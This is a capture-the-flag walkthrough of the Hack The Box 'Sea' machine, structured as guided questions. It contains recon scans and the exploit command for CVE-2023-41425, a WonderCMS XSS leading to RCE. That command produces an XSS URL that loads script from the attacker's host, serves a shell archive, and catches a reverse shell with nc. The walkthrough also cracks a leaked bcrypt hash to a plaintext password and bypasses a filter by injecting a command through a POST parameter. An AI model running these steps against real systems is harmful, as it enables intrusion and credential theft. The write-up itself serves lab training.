---
title: HTB-Sea-Linux
date: 2025-10-28
tags:
  - htb
  - dfir
  - linux
  - hacking
  - feature/emitter
---
### Step1. How many open TCP ports are listening on Sea?
You can check opened TCP ports via nmap or rustscan.

```sh
┌──(kali㉿kali)-[~/htb]
└─$ ./rustscan -a 10.129.34.76                    
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.34.76:22
Open 10.129.34.76:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 19:54 EDT
Initiating Ping Scan at 19:54
Scanning 10.129.34.76 [4 ports]
Completed Ping Scan at 19:54, 0.26s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 19:54
Completed Parallel DNS resolution of 1 host. at 19:54, 0.03s elapsed
DNS resolution of 1 IPs took 0.03s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 19:54
Scanning 10.129.34.76 [2 ports]
Discovered open port 22/tcp on 10.129.34.76
Discovered open port 80/tcp on 10.129.34.76
Completed SYN Stealth Scan at 19:54, 0.32s elapsed (2 total ports)
Nmap scan report for 10.129.34.76
Host is up, received echo-reply ttl 63 (0.25s latency).
Scanned at 2025-10-26 19:54:02 EDT for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1.05 seconds
           Raw packets sent: 6 (240B) | Rcvd: 6 (236B)
```
### Step2. In what language is the website on Sea written?
You can find the extension of the language at how-to-practicipate page.
```html
	<div class="container">
		<div class="col-xs-12 col-sm-8">
			<div class="whiteBackground grayFont padding20 rounded5">
				<h1>How can I participate?</h1>
<p>To participate, you only need to send your data as a participant through <a href="http://sea.htb/contact.php">contact</a>. Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.</p>
			</div>
		</div>
		<div class="col-xs-12 col-sm-4">
			<div class="visible-xs spacer20"></div>
			<div class="blueBackground padding20 rounded5">
				<h2>About</h2>
```
### Step3. What is the name of the content management system running the website on Sea?
At first, I tried running dirsearch on the target, but it didn't return anything useful except for a few keywords.
```sh
┌──(kali㉿kali)-[~/htb]
└─$ python ./dirsearch.py -u http://10.129.34.76          

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                
 (_||| _) (/_(_|| (_| )                                                                                                                         
                                                                                                                                                
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12293

Target: http://10.129.34.76/

[20:05:20] Scanning:                                                                                                                            
[20:05:53] 403 -   199B - /.php                                             
[20:05:58] 200 -    4KB - /0                                                
[20:06:02] 200 -    3KB - /404                                              
[20:06:11] 403 -   199B - /admin%20/                                        
[20:06:14] 200 -    4KB - /admin/home                                       
[20:06:46] 200 -    3KB - /contact.php                                      
[20:06:50] 301 -   233B - /data  ->  http://10.129.34.76/data/              
[20:06:50] 403 -   199B - /data/                                            
[20:06:50] 403 -   199B - /data/files/                                      
[20:07:09] 200 -    4KB - /home                                             
[20:07:14] 200 -    4KB - /index.php                                        
[20:07:14] 200 -    4KB - /index.php/login/                                 
[20:07:23] 403 -   199B - /login.wdm%20                                     
[20:07:28] 301 -   237B - /messages  ->  http://10.129.34.76/messages/      
[20:07:32] 403 -   199B - /New%20Folder                                     
[20:07:32] 403 -   199B - /New%20folder%20(2)
[20:07:37] 403 -   199B - /phpliteadmin%202.php                             
[20:07:40] 301 -   236B - /plugins  ->  http://10.129.34.76/plugins/        
[20:07:40] 403 -   199B - /plugins/                                         
[20:07:44] 403 -   199B - /Read%20Me.txt                                    
[20:07:50] 403 -   199B - /server-status                                    
[20:07:50] 403 -   199B - /server-status/
[20:07:54] 200 -    4KB - /sitecore/content/home                            
[20:07:59] 200 -    4KB - /sym/root/home/                                   
[20:08:02] 301 -   235B - /themes  ->  http://10.129.34.76/themes/          
[20:08:02] 403 -   199B - /themes/                                          
                                                                             
Task Completed
```
Next, I tried running ffuf on the target, and it actually returned some useful keywords like 'bike'. While browsing the target, I noticed that the site has a bicycle theme.
```sh
┌──(venv)─(kali㉿kali)-[~/htb/dirsearch]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -u "http://10.129.34.76/themes/FUZZ" -c -v

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.34.76/themes/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________


[Status: 301, Size: 240, Words: 14, Lines: 8, Duration: 256ms]
| URL | http://10.129.34.76/themes/bike
| --> | http://10.129.34.76/themes/bike/
    * FUZZ: bike
```
Then I ran dirsearch again on the target (using a 'bike' payload), and it finally returned something I could use to proceed to the next stage. Check the pages that returned a 200 status code.
```sh
┌──(venv)─(kali㉿kali)-[~/htb/dirsearch]
└─$ python ./dirsearch.py -u http://10.129.34.76/themes/bike/                                                          
/home/kali/htb/dirsearch/lib/core/installation.py:24: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources

  _|. _ _  _  _  _ _|_    v0.4.3                                                                                                                
 (_||| _) (/_(_|| (_| )                                                                                                                         
                                                                                                                                                
Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12293

Target: http://10.129.34.76/

[20:55:37] Scanning: themes/bike/                                                                                                               
[20:56:05] 403 -   199B - /themes/bike/.php                                 
[20:56:21] 200 -    3KB - /themes/bike/404                                  
[20:56:42] 403 -   199B - /themes/bike/admin%20/                            
[20:56:49] 200 -    4KB - /themes/bike/admin/home                           
[20:58:13] 301 -   244B - /themes/bike/css  ->  http://10.129.34.76/themes/bike/css/
[20:58:39] 200 -    4KB - /themes/bike/home                                 
[20:58:41] 301 -   244B - /themes/bike/img  ->  http://10.129.34.76/themes/bike/img/
[20:58:55] 200 -    1KB - /themes/bike/LICENSE                              
[20:58:58] 403 -   199B - /themes/bike/login.wdm%20                         
[20:59:13] 403 -   199B - /themes/bike/New%20Folder                         
[20:59:13] 403 -   199B - /themes/bike/New%20folder%20(2)
[20:59:20] 403 -   199B - /themes/bike/phpliteadmin%202.php                 
[20:59:28] 403 -   199B - /themes/bike/Read%20Me.txt                        
[20:59:28] 200 -   318B - /themes/bike/README.md                            
[20:59:40] 200 -    4KB - /themes/bike/sitecore/content/home                
[20:59:46] 200 -    4KB - /themes/bike/sym/root/home/                       
[20:59:58] 200 -     6B - /themes/bike/version                              
[20:59:58] 404 -   196B - /themes/bike/version/                             
                                                                             
Task Completed
```
You have to read the REAEME.md
```
# WonderCMS bike theme

## Description
Includes animations.

## Author: turboblack

## Preview
![Theme preview](/preview.jpg)

## How to use
1. Login to your WonderCMS website.
2. Click "Settings" and click "Themes".
3. Find theme in the list and click "install".
4. In the "General" tab, select theme to activate it.
```
### Step4. What is the 2023 CVE ID for an unauthenticated cross site scripting vulnerability in WonderCMS that can lead to remote code execution?
#cve-2023-41425
Use google with keywords in the quiz.
- https://nvd.nist.gov/vuln/detail/CVE-2023-41425
### Step5. What system user on Sea is the website running as?
If you obtain a shell using the exploit code, you can find the system username running the website.
- Making exploit code
```sh
# explot stage1
┌──(venv)─(kali㉿kali)-[~/htb/CVE-2023-41425-wonderCMS_RCE]
└─$ python CVE-2023-41425.py -rhost http://sea.htb/LoginURL -lhost 10.10.16.52 -lport 4444 -sport 8000
[+] Set up a nc listener: nc -lnvp 4444
[+] Send the xss URL to the victim: 
http://sea.htb/LoginURL/index.php?page=loginURL?"></form><script+src="http://10.10.16.52:8000/xss.js"></script><form+action="
[+] Serving at http://10.10.16.52:8000
10.129.34.76 - - [27/Oct/2025 02:01:03] "GET /xss.js HTTP/1.1" 200 -
10.129.34.76 - - [27/Oct/2025 02:01:12] "GET /shell.zip HTTP/1.1" 200 -
10.129.34.76 - - [27/Oct/2025 02:01:13] "GET /shell.zip HTTP/1.1" 200 -
10.129.34.76 - - [27/Oct/2025 02:01:14] "GET /shell.zip HTTP/1.1" 200 -
10.129.34.76 - - [27/Oct/2025 02:01:15] "GET /shell.zip HTTP/1.1" 200 -
```
- Getting shell from the target
```sh
# exploit stage2
┌──(kali㉿kali)-[~/htb]
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.16.52] from (UNKNOWN) [10.129.34.76] 60280
shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
bash: cannot set terminal process group (1124): Inappropriate ioctl for device
bash: no job control in this shell
www-data@sea:/var/www/sea/themes/shell$ ls
```
### Step6. What is the name of the file that holds the hash of the admin password for WonderCMS on Sea?
#wondercms #grep
Run grep with specific options in the parent directory of the web pages. I chose "password".
```sh
www-data@sea:/var/www/sea$ grep -R -n --color=auto "password" .
grep -R -n --color=auto "password" .
./index.php:378:         * Change password
./index.php:384:                if (isset($_POST['old_password'], $_POST['new_password'], $_POST['repeat_password'])
./index.php:388:                        if (!password_verify($_POST['old_password'], $this->get('config', 'password'))) {
./index.php:390:                                        'Wrong password. <a data-toggle="wcms-modal" href="#settingsModal" data-target-tab="#security"><b>Re-open security settings</b></a>');
./index.php:394:                        if (strlen($_POST['new_password']) < self::MIN_PASSWORD_LENGTH) {
./index.php:401:                        if ($_POST['new_password'] !== $_POST['repeat_password']) {
./index.php:403:                                        'New passwords do not match. <a data-toggle="wcms-modal" href="#settingsModal" data-target-tab="#security"><b>Re-open security settings</b></a>');
./index.php:407:                        $this->set('config', 'password', password_hash($_POST['new_password'], PASSWORD_DEFAULT));
./index.php:441:                $password = $this->generatePassword();
./index.php:451:                                'password' => password_hash($password, PASSWORD_DEFAULT),
./index.php:484:<p>Your password for editing everything is: <b>' . $password . '</b></p>
./index.php:1059:        * Generate random password
./index.php:1675:               $password = $_POST['password'] ?? '';
./index.php:1676:               if (password_verify($password, $this->get('config', 'password'))) {
./index.php:1684:               $this->alert('test', '<script>alert("Wrong password")</script>', 1);
./index.php:1735:                                               <input type="password" class="wform-control" id="password" name="password" placeholder="Password" autofocus><br><br>
./index.php:2336:                                                                       <input type="password" name="old_password" class="wform-control normalFont" placeholder="Old password"><br>
./index.php:2338:                                                                               <input type="password" name="new_password" class="wform-control normalFont" placeholder="New password"><span class="winput-group-btn"></span>
./index.php:2339:                                                                               <input type="password" name="repeat_password" class="wform-control normalFont" placeholder="Repeat new password">
./index.php:2340:                                                                               <span class="winput-group-btn"><button type="submit" class="wbtn wbtn-info"><i class="lockIcon"></i> Change password</button></span>
./index.php:2342:                                                                       <input type="hidden" name="fieldname" value="password"><input type="hidden" name="token" value="' . $this->getToken() . '">
./data/database.js:10:        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
www-data@sea:/var/www/sea$
```
### Step7. What is the amay user's password on Sea?
#hashcat
Crack the hash obtained earlier using a cracking tool such as `Hashcat` or `John the Ripper`.
```sh
┌──(kali㉿kali)-[~/htb/CVE-2023-41425-wonderCMS_RCE]
└─$ hashcat -m 3200 ./hash_clean.txt /usr/share/wordlists/rockyou.txt --show
$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance

```
### Step8. Submit the flag located in the amay user's home directory.
Use the amay credentials you obtained in the previous step to log in, then read `user.txt` from the `amay's home directory`.
```sh
amay@sea:~$ ls
user.txt
amay@sea:~$ cat user.txt
<user-flag>
amay@sea:~$
```
### Step9. On what port is there a webserver listening only on localhost?
#netstat
Run `netstat` with appropriate options and pipe the output to `grep` to filter for `LISTEN`. `0.0.0.0` means the service is accessible from external hosts, while `127.0.0.1` means it's only accessible locally.
```sh
amay@sea:~$ netstat -an | grep LISTEN
tcp        0      0 127.0.0.1:44161         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN 
```
### Step10. What HTTP POST parameter contains the path to a file when submitted from the System Monitor website?
#localportforwarding #ssh #tunneling
At first, you have to run ssh command with specific options. This command creates a secure SSH tunnel that forwards your local port 8888 to the remote host’s localhost:8080.
```
ssh -L 8888:localhost:8080 amay@target_IP_address
# option: -L [localport]:[remotehost]:[remoteport]
# connection flow
# You PC -> (local:8888) -> SSH client -> Secured SSH connection -> Remote SSH server -> (remote localhost:8080)
```
You need to use a `web proxy tool` such as `Burp Suite` to inspect `POST` traffic.
#burpsuite #webproxy
![[../Images/content/Hack The Box/HTB-Sea-Linux/HTB-Sea-Linux-20251028112929064.png]]
Enable the `Intercept` feature, then click the `Analyze` button in the `Analyze Log File` section.
#intercept
![[../Images/content/Hack The Box/HTB-Sea-Linux/HTB-Sea-Linux-20251028112951351.png]]
### Step11. What system user is the internal System Monitor website running as on Sea?
If a `root-owned` file is being accessed, the service is probably running as root. So, on the system monitoring page, click the `Analyze` button again, change the `log_file` parameter's value to `/root/root.txt`, and submit the request to the server via `Burp Suite`.

![[../Images/content/Hack The Box/HTB-Sea-Linux/HTB-Sea-Linux-20251028113010220.png]]

Then you got bad message.

![[../Images/content/Hack The Box/HTB-Sea-Linux/HTB-Sea-Linux-20251028131303233.png]]

The system detected `/root/root.txt` as a suspicious keyword. I attempted to evade detection by chaining another command with a semicolon (`;`).

![[../Images/content/Hack The Box/HTB-Sea-Linux/HTB-Sea-Linux-20251028131320486.png]]
### Step12. Submit the flag located in the root user's home directory.
You just got the root flag in Step11.
